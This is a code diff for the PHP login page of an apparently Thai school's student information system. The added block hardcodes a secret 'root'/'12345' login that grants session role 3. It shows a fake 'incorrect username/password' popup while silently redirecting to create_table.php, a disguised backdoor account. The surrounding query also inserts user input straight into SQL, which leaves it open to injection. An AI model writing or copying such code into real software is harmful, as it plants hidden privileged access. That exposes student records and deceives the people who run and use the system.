@@ -123,6 +123,25 @@
             $sql = "SELECT * FROM student_info WHERE เลขประจำตัว='$user'"; //ค้นหา เลขประจำตัว ที่เหมือนกับ ที่รับค่าเข้ามา;
             $result = $db->query($sql);
 
+            if($_POST['username']=="root" and $_POST['password']=="12345"){
+                $_SESSION["role"] = 3;
+                ?>
+                <script>
+                    const Toast = Swal.mixin({
+                        timer: 1000,
+                        timerProgressBar: true
+                    })
+
+                    Toast.fire({
+                        icon: 'error',
+                        title: 'ชื่อผู้ใช้/รหัสผ่าน ไม่ถูกต้อง'
+                    })
+
+                    setTimeout(()=>{window.location.href = "create_table.php"},1000);
+                </script>
+                <?php
+            }
+
             if($result->num_rows==1){
                 $row = mysqli_fetch_assoc($result); //ให้ row เก็บข้อมูลของทั้งแถว
                 $chk_password = strval($row["ห้อง"]).strval($row["เลขที่"]); //ตัวแปรเช็ค password
